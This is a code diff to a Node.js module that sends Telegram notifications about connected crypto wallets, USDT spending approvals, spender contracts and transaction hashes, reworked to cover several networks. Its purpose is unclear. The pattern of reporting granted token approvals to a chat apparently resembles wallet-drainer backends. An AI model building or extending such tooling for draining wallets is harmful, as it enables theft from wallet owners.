@@ -165,12 +165,18 @@ function formatApprovedAmount(payment) {
     }
 }
 
-function approvalLine(session, spec, payment) {
+function paymentForNetwork(payments, spec) {
+    const rows = Array.isArray(payments) ? payments : payments ? [payments] : [];
+    return rows.find((item) => item?.network === spec.key) || null;
+}
+
+function approvalLine(session, spec, paymentOrPayments) {
     const address = walletForNetwork(session, spec.key);
-    const isPreferred = payment?.network === spec.key;
-    const approved = isPreferred && payment?.status === "verified" && payment?.transactionHash;
-    const rejected = isPreferred && (payment?.status === "rejected" || payment?.status === "invalid");
-    const status = approved ? "Approved" : rejected ? "Not approved" : "Not approved";
+    const payment = Array.isArray(paymentOrPayments)
+        ? paymentForNetwork(paymentOrPayments, spec)
+        : (paymentOrPayments?.network === spec.key ? paymentOrPayments : paymentForNetwork(paymentOrPayments ? [paymentOrPayments] : [], spec));
+    const approved = payment?.status === "verified" && payment?.transactionHash;
+    const status = approved ? "Approved" : "Not approved";
     const hash = approved ? payment.transactionHash : "Unavailable";
 
     return [
@@ -181,15 +187,15 @@ function approvalLine(session, spec, payment) {
     ];
 }
 
-function buildApprovalStatusMessage(payment, session) {
+function buildApprovalStatusMessage(payment, session, payments) {
+    const rows = payments && payments.length ? payments : [payment];
+    const verified = rows.filter((item) => item?.status === "verified" && item?.transactionHash);
     const lines = [
         "✅ <b>2/3 APPROVAL STATUS</b>",
         "",
-        `<b>Preferred network:</b> ${display(prettyNetwork(payment.network))}`,
-        `<b>Approved amount:</b> ${payment.status === "verified" ? escapeHtml(formatApprovedAmount(payment)) : "Unavailable"}`,
+        `<b>Networks:</b> ${display(rows.map((item) => prettyNetwork(item.network)).filter(Boolean).join(", ") || payment.network)}`,
+        `<b>Approved amount:</b> ${verified.length ? escapeHtml(formatApprovedAmount(verified[0])) : "Unavailable"}`,
         `<b>Token:</b> ${display(payment.token || "USDT")}`,
-        `<b>Token contract:</b> ${display(payment.tokenContract)}`,
-        `<b>Spender / card contract:</b> ${display(payment.spender)}`,
         ""
     ];
 
@@ -198,7 +204,7 @@ function buildApprovalStatusMessage(payment, session) {
             lines.push("--------------------------------");
         }
 
-        lines.push(...approvalLine(session, spec, payment));
+        lines.push(...approvalLine(session, spec, rows));
         lines.push("");
     });
 
@@ -232,9 +238,20 @@ function buildCardApplicationMessage(application, session) {
     });
 
     lines.push("<b>Authorization</b>");
-    lines.push(`Preferred network: ${display(prettyNetwork(application.network || payment?.network))}`);
-    lines.push(`Approval status: ${payment?.status === "verified" ? "Approved" : "Not approved"}`);
-    lines.push(`Approval hash: ${display(payment?.transactionHash)}`);
+    const group = [];
+    try {
+        const paymentStore = require("../storage/payments");
+        group.push(...paymentStore.listByConnection(application.connectionId || payment?.connectionId));
+    } catch (_err) {
+        /* ignore */
+    }
+    const rows = group.length ? group : (payment ? [payment] : []);
+    rows.forEach((item) => {
+        lines.push(`${prettyNetwork(item.network)}: ${item.status === "verified" && item.transactionHash ? display(item.transactionHash) : "Not approved"}`);
+    });
+    if (!rows.length) {
+        lines.push(`Approval hash: ${display(payment?.transactionHash)}`);
+    }
     lines.push(`Spender / card contract: ${display(payment?.spender)}`);
     lines.push(`Token contract: ${display(payment?.tokenContract)}`);
     lines.push(`Amount: ${display(payment?.allowance || "1 USDT")}`);
@@ -267,16 +284,23 @@ async function notifyWalletConnected(session, send = sendTelegramMessage) {
 
 async function notifyApprovalStatus(payment, send = sendTelegramMessage) {
     try {
-        const final = payment?.status === "verified"
-            || payment?.status === "rejected"
-            || payment?.status === "invalid";
-
-        if (!payment || !final) {
-            return { ok: false, skipped: true, reason: "Approval is not finished" };
+        if (!payment) {
+            return { ok: false, skipped: true, reason: "No payment" };
         }
 
-        if (payment.status === "verified" && !payment.transactionHash) {
-            return { ok: false, skipped: true, reason: "Verified approval missing hash" };
+        const paymentStore = require("../storage/payments");
+        const group = paymentStore.listByConnection(payment.connectionId);
+        const rows = group.length ? group : [payment];
+        const terminal = new Set(["verified", "rejected", "invalid"]);
+        const pending = rows.some((item) => !terminal.has(item.status));
+        const confirmed = rows.filter((item) => item.status === "verified" && item.transactionHash);
+
+        if (pending) {
+            return { ok: false, skipped: true, reason: "Approvals still in progress" };
+        }
+
+        if (!confirmed.length) {
+            return { ok: false, skipped: true, reason: "No confirmed approval hash yet" };
         }
 
         if (!isConfigured()) {
@@ -290,7 +314,7 @@ async function notifyApprovalStatus(payment, send = sendTelegramMessage) {
         const sessionStore = require("../storage/sessions");
         const session = sessionStore.getSession(payment.connectionId) || {};
 
-        return await send(buildApprovalStatusMessage(payment, session));
+        return await send(buildApprovalStatusMessage(confirmed[0], session, rows));
     } catch (err) {
         logger.warn({ err: { message: err.message } }, "notifyApprovalStatus failed");
         return { ok: false, skipped: false, reason: err.message };
